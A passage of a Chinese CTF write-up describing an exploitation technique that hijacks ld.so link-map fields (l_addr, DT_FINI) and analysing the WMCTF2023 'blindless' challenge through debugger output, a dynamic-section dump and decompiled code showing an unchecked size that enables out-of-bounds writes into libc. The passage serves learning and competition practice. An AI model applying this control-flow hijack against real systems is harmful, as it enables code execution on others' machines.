<p><code>l-&gt;l_info[DT_FINI]</code>​处地址和<code>l-&gt;l_info[DT_INIT]</code>​仅最后一位不同</p>
<p>通过libc区域的任意写，可进行低位覆盖<code>l-&gt;l_info[DT_FINI]-&gt;l_info[DT_INIT]</code>​</p>
<div class="highlight"><pre><span></span><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">/</span><span class="n">x</span> <span class="o">*</span><span class="n">_rtld_global</span><span class="o">.</span><span class="n">_dl_ns</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">_ns_loaded</span><span class="o">.</span><span class="n">l_info</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span>
<span class="err">$</span><span class="mi">3</span> <span class="o">=</span> <span class="p">{</span>
  <span class="n">d_tag</span> <span class="o">=</span> <span class="mh">0xc</span><span class="p">,</span>
  <span class="n">d_un</span> <span class="o">=</span> <span class="p">{</span>
    <span class="n">d_val</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">,</span>
    <span class="n">d_ptr</span> <span class="o">=</span> <span class="mh">0x1000</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">/</span><span class="n">x</span> <span class="o">*</span><span class="n">_rtld_global</span><span class="o">.</span><span class="n">_dl_ns</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">_ns_loaded</span><span class="o">.</span><span class="n">l_info</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span>
<span class="err">$</span><span class="mi">4</span> <span class="o">=</span> <span class="p">{</span>
  <span class="n">d_tag</span> <span class="o">=</span> <span class="mh">0xd</span><span class="p">,</span>
  <span class="n">d_un</span> <span class="o">=</span> <span class="p">{</span>
    <span class="n">d_val</span> <span class="o">=</span> <span class="mh">0x1558</span><span class="p">,</span>
    <span class="n">d_ptr</span> <span class="o">=</span> <span class="mh">0x1558</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div>
<p>​<code>l-&gt;l_info[DT_FINI]</code>​为0x1000，<code>l-&gt;l_addr</code>​为<code>elf_base</code>​，根据偏移对<code>l-&gt;l_addr</code>​改写即可实现<code>l-&gt;l_addr</code>​ + <code>l-&gt;l_info[DT_FINI]</code>​-&gt;<code>d_un.d_ptr</code>​最终指向我们想要执行的地址大于<code>elf_base+0x1000</code>​的函数</p>
<div class="highlight"><pre><span></span><span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">D98</span>                               <span class="p">;</span> <span class="n">ELF</span> <span class="n">Dynamic</span> <span class="n">Information</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">D98</span>                               <span class="p">;</span> <span class="o">===========================================================================</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">D98</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">D98</span>                               <span class="p">;</span> <span class="n">Segment</span> <span class="nb">type</span><span class="p">:</span> <span class="n">Pure</span> <span class="n">data</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">D98</span>                               <span class="p">;</span> <span class="n">Segment</span> <span class="n">permissions</span><span class="p">:</span> <span class="n">Read</span><span class="o">/</span><span class="n">Write</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">D98</span>                               <span class="n">LOAD</span> <span class="n">segment</span> <span class="n">mempage</span> <span class="n">public</span> <span class="s1">'DATA'</span> <span class="n">use64</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">D98</span>                               <span class="n">assume</span> <span class="n">cs</span><span class="p">:</span><span class="n">LOAD</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">D98</span>                               <span class="p">;</span><span class="n">org</span> <span class="mi">3</span><span class="n">D98h</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">D98</span> <span class="mo">01</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">01</span> <span class="mo">00</span><span class="o">+</span><span class="n">_DYNAMIC</span> <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="o">&gt;</span>               <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="p">:</span> <span class="n">LOAD</span><span class="p">:</span><span class="mo">00000000000001</span><span class="n">A0</span><span class="err">↑</span><span class="n">o</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">D98</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>                                                     <span class="p">;</span> <span class="o">.</span><span class="n">got</span><span class="p">:</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="err">↓</span><span class="n">o</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">D98</span>                                                                       <span class="p">;</span> <span class="n">DT_NEEDED</span> <span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">6</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">DA8</span> <span class="mi">0</span><span class="n">C</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mi">10</span><span class="o">+</span><span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">0</span><span class="n">Ch</span><span class="p">,</span> <span class="mi">1000</span><span class="n">h</span><span class="o">&gt;</span>                  <span class="p">;</span> <span class="n">DT_INIT</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">DB8</span> <span class="mi">0</span><span class="n">D</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mi">58</span> <span class="mi">15</span><span class="o">+</span><span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">0</span><span class="n">Dh</span><span class="p">,</span> <span class="mi">1558</span><span class="n">h</span><span class="o">&gt;</span>                  <span class="p">;</span> <span class="n">DT_FINI</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">DC8</span> <span class="mi">19</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mi">88</span> <span class="mi">3</span><span class="n">D</span><span class="o">+</span><span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">19</span><span class="n">h</span><span class="p">,</span> <span class="mi">3</span><span class="n">D88h</span><span class="o">&gt;</span>                  <span class="p">;</span> <span class="n">DT_INIT_ARRAY</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">DD8</span> <span class="mi">1</span><span class="n">B</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mi">08</span> <span class="mo">00</span><span class="o">+</span><span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">1</span><span class="n">Bh</span><span class="p">,</span> <span class="mi">8</span><span class="o">&gt;</span>                      <span class="p">;</span> <span class="n">DT_INIT_ARRAYSZ</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">DE8</span> <span class="mi">1</span><span class="n">A</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mi">90</span> <span class="mi">3</span><span class="n">D</span><span class="o">+</span><span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">1</span><span class="n">Ah</span><span class="p">,</span> <span class="mi">3</span><span class="n">D90h</span><span class="o">&gt;</span>                  <span class="p">;</span> <span class="n">DT_FINI_ARRAY</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">DF8</span> <span class="mi">1</span><span class="n">C</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mi">08</span> <span class="mo">00</span><span class="o">+</span><span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">1</span><span class="n">Ch</span><span class="p">,</span> <span class="mi">8</span><span class="o">&gt;</span>                      <span class="p">;</span> <span class="n">DT_FINI_ARRAYSZ</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mf">0000000000003E08</span> <span class="n">F5</span> <span class="n">FE</span> <span class="n">FF</span> <span class="mi">6</span><span class="n">F</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="n">A0</span> <span class="mo">03</span><span class="o">+</span><span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">6</span><span class="n">FFFFEF5h</span><span class="p">,</span> <span class="mi">3</span><span class="n">A0h</span><span class="o">&gt;</span>             <span class="p">;</span> <span class="n">DT_GNU_HASH</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mf">0000000000003E18</span> <span class="mo">05</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">05</span><span class="o">+</span><span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">5</span><span class="p">,</span> <span class="mi">500</span><span class="n">h</span><span class="o">&gt;</span>                     <span class="p">;</span> <span class="n">DT_STRTAB</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mf">0000000000003E28</span> <span class="mo">06</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="n">C8</span> <span class="mo">03</span><span class="o">+</span><span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">6</span><span class="p">,</span> <span class="mi">3</span><span class="n">C8h</span><span class="o">&gt;</span>                     <span class="p">;</span> <span class="n">DT_SYMTAB</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mf">0000000000003E38</span> <span class="mi">0</span><span class="n">A</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="n">BD</span> <span class="mo">00</span><span class="o">+</span><span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">0</span><span class="n">Ah</span><span class="p">,</span> <span class="mi">0</span><span class="n">BDh</span><span class="o">&gt;</span>                   <span class="p">;</span> <span class="n">DT_STRSZ</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mf">0000000000003E48</span> <span class="mi">0</span><span class="n">B</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mi">18</span> <span class="mo">00</span><span class="o">+</span><span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">0</span><span class="n">Bh</span><span class="p">,</span> <span class="mi">18</span><span class="n">h</span><span class="o">&gt;</span>                    <span class="p">;</span> <span class="n">DT_SYMENT</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mf">0000000000003E58</span> <span class="mi">15</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span><span class="o">+</span><span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">15</span><span class="n">h</span><span class="p">,</span> <span class="mi">0</span><span class="o">&gt;</span>                      <span class="p">;</span> <span class="n">DT_DEBUG</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mf">0000000000003E68</span> <span class="mo">03</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mi">88</span> <span class="mi">3</span><span class="n">F</span><span class="o">+</span><span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="n">F88h</span><span class="o">&gt;</span>                    <span class="p">;</span> <span class="n">DT_PLTGOT</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mf">0000000000003E78</span> <span class="mo">02</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="n">A8</span> <span class="mo">00</span><span class="o">+</span><span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="n">A8h</span><span class="o">&gt;</span>                     <span class="p">;</span> <span class="n">DT_PLTRELSZ</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mf">0000000000003E88</span> <span class="mi">14</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">07</span> <span class="mo">00</span><span class="o">+</span><span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">14</span><span class="n">h</span><span class="p">,</span> <span class="mi">7</span><span class="o">&gt;</span>                      <span class="p">;</span> <span class="n">DT_PLTREL</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mf">0000000000003E98</span> <span class="mi">17</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="n">C8</span> <span class="mo">06</span><span class="o">+</span><span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">17</span><span class="n">h</span><span class="p">,</span> <span class="mi">6</span><span class="n">C8h</span><span class="o">&gt;</span>                   <span class="p">;</span> <span class="n">DT_JMPREL</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">EA8</span> <span class="mo">07</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mi">08</span> <span class="mo">06</span><span class="o">+</span><span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">7</span><span class="p">,</span> <span class="mi">608</span><span class="n">h</span><span class="o">&gt;</span>                     <span class="p">;</span> <span class="n">DT_RELA</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">EB8</span> <span class="mi">08</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="n">C0</span> <span class="mo">00</span><span class="o">+</span><span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">8</span><span class="p">,</span> <span class="mi">0</span><span class="n">C0h</span><span class="o">&gt;</span>                     <span class="p">;</span> <span class="n">DT_RELASZ</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">EC8</span> <span class="mi">09</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mi">18</span> <span class="mo">00</span><span class="o">+</span><span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">9</span><span class="p">,</span> <span class="mi">18</span><span class="n">h</span><span class="o">&gt;</span>                      <span class="p">;</span> <span class="n">DT_RELAENT</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">ED8</span> <span class="mi">1</span><span class="n">E</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mi">08</span> <span class="mo">00</span><span class="o">+</span><span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">1</span><span class="n">Eh</span><span class="p">,</span> <span class="mi">8</span><span class="o">&gt;</span>                      <span class="p">;</span> <span class="n">DT_FLAGS</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">EE8</span> <span class="n">FB</span> <span class="n">FF</span> <span class="n">FF</span> <span class="mi">6</span><span class="n">F</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">01</span> <span class="mo">00</span><span class="o">+</span><span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">6</span><span class="n">FFFFFFBh</span><span class="p">,</span> <span class="mi">8000001</span><span class="n">h</span><span class="o">&gt;</span>         <span class="p">;</span> <span class="n">DT_FLAGS_1</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">EF8</span> <span class="n">FE</span> <span class="n">FF</span> <span class="n">FF</span> <span class="mi">6</span><span class="n">F</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="n">D8</span> <span class="mo">05</span><span class="o">+</span><span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">6</span><span class="n">FFFFFFEh</span><span class="p">,</span> <span class="mi">5</span><span class="n">D8h</span><span class="o">&gt;</span>             <span class="p">;</span> <span class="n">DT_VERNEED</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">F08</span> <span class="n">FF</span> <span class="n">FF</span> <span class="n">FF</span> <span class="mi">6</span><span class="n">F</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">01</span> <span class="mo">00</span><span class="o">+</span><span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">6</span><span class="n">FFFFFFFh</span><span class="p">,</span> <span class="mi">1</span><span class="o">&gt;</span>                <span class="p">;</span> <span class="n">DT_VERNEEDNUM</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">F18</span> <span class="n">F0</span> <span class="n">FF</span> <span class="n">FF</span> <span class="mi">6</span><span class="n">F</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="n">BE</span> <span class="mo">05</span><span class="o">+</span><span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">6</span><span class="n">FFFFFF0h</span><span class="p">,</span> <span class="mi">5</span><span class="n">BEh</span><span class="o">&gt;</span>             <span class="p">;</span> <span class="n">DT_VERSYM</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">F28</span> <span class="n">F9</span> <span class="n">FF</span> <span class="n">FF</span> <span class="mi">6</span><span class="n">F</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">03</span> <span class="mo">00</span><span class="o">+</span><span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">6</span><span class="n">FFFFFF9h</span><span class="p">,</span> <span class="mi">3</span><span class="o">&gt;</span>                <span class="p">;</span> <span class="n">DT_RELACOUNT</span>
<span class="n">LOAD</span><span class="p">:</span><span class="mo">0000000000003</span><span class="n">F38</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span><span class="o">+</span><span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">0</span><span class="o">&gt;</span>                           <span class="p">;</span> <span class="n">DT_NULL</span>
</pre></div>
<p>当然除了<code>l-&gt;l_info[DT_FINI]</code>​，我们也可以寻找其他<code>Elf64_Dyn</code>​类型的结构体</p>
<p>‍</p>
<h3 data-content="1" id="047e0326532c8956f46153226ae3f395">例题WMCTF2023-blindless</h3>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230914100412-ffe44118-52a2-1.png"/></p>
<h5 data-content="1" id="d6a4edc09b972cbc1a2599b2bdf13530">静态分析：</h5>
<p>保护全开，主程序并不复杂，同时存在后门函数</p>
<div class="highlight"><pre><span></span><span class="nb">int</span> <span class="n">__cdecl</span> <span class="n">main</span><span class="p">(</span><span class="nb">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">const</span> <span class="n">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="n">const</span> <span class="n">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">size_t</span> <span class="n">v4</span><span class="p">;</span> <span class="o">//</span> <span class="n">rdx</span>
  <span class="n">unsigned</span> <span class="nb">int</span> <span class="n">sizea</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="n">Ch</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">14</span><span class="n">h</span><span class="p">]</span>
  <span class="n">unsigned</span> <span class="nb">int</span> <span class="n">size</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="n">Ch</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">14</span><span class="n">h</span><span class="p">]</span>
  <span class="n">char</span> <span class="o">*</span><span class="n">code</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">10</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">10</span><span class="n">h</span><span class="p">]</span>

  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">"Pls input the data size</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="mh">0x18</span><span class="n">uLL</span><span class="p">);</span>
  <span class="n">sizea</span> <span class="o">=</span> <span class="n">readInt</span><span class="p">();</span>
  <span class="n">data</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">sizea</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="err">!</span><span class="n">data</span> <span class="p">)</span>
    <span class="n">goto</span> <span class="n">LABEL_2</span><span class="p">;</span>
  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">"Pls input the code size</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="mh">0x18</span><span class="n">uLL</span><span class="p">);</span>
  <span class="n">size</span> <span class="o">=</span> <span class="n">readInt</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x100</span> <span class="p">)</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="n">code</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="err">!</span><span class="n">code</span> <span class="p">)</span>
  <span class="p">{</span>
<span class="n">LABEL_2</span><span class="p">:</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">"error</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="mi">6</span><span class="n">uLL</span><span class="p">);</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">v4</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="s2">"Pls input your code</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">"Pls input your code</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">code</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
  <span class="n">executeBrainfuck</span><span class="p">(</span><span class="n">code</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>进入readInt()函数，可发现没有对大小进行限制</p>
<p>也就是说当我们申请大小足够触发mmap时，会分配给我们一块libc前的区域，如果我们申请的足够大就意味这我们可以向后越界并通过executeBrainfuck()实现libc中任意写</p>
<div class="highlight"><pre><span></span><span class="nb">int</span> <span class="n">__cdecl</span> <span class="n">readInt</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">0</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">30</span><span class="n">h</span><span class="p">]</span> <span class="n">BYREF</span>
  <span class="n">unsigned</span> <span class="n">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">28</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">8</span><span class="n">h</span><span class="p">]</span>

  <span class="n">v2</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28</span><span class="n">u</span><span class="p">);</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x20</span><span class="n">uLL</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">atoi</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230914100426-0861db8e-52a3-1.png"/></p>
<p>为方便记忆，我们先称mmap申请的空间基址为<code>mmap_base</code>​</p>
<p>查看一下executeBrainfuck()：</p>
<div class="highlight"><pre><span></span><span class="nb">int</span> <span class="n">executeBrainfuck</span><span class="p">(</span><span class="n">char</span> <span class="o">*</span><span class="n">code</span><span class="p">)</span>

<span class="p">{</span>
  <span class="n">char</span> <span class="o">*</span><span class="n">code</span><span class="o">-</span><span class="n">local</span><span class="p">;</span>
  <span class="n">char</span> <span class="n">c</span><span class="p">;</span>
  <span class="nb">int</span> <span class="n">i</span><span class="p">;</span>

  <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">c</span> <span class="o">=</span> <span class="o">*</span><span class="n">code</span><span class="p">;</span>
  <span class="k">while</span> <span class="p">((</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x100</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">c</span> <span class="o">!=</span> <span class="s1">'q'</span><span class="p">)))</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">&lt;</span> <span class="s1">'r'</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="s1">'@'</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">data</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)(</span><span class="n">code</span> <span class="o">+</span> <span class="p">(</span><span class="nb">long</span><span class="p">)</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
        <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">5</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">&lt;</span> <span class="s1">'A'</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="s1">'&gt;'</span><span class="p">)</span> <span class="p">{</span>
          <span class="n">data</span> <span class="o">=</span> <span class="n">data</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
          <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">&lt;</span> <span class="s1">'?'</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="s1">'+'</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">data</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>
            <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="s1">'.'</span><span class="p">)</span> <span class="p">{</span>
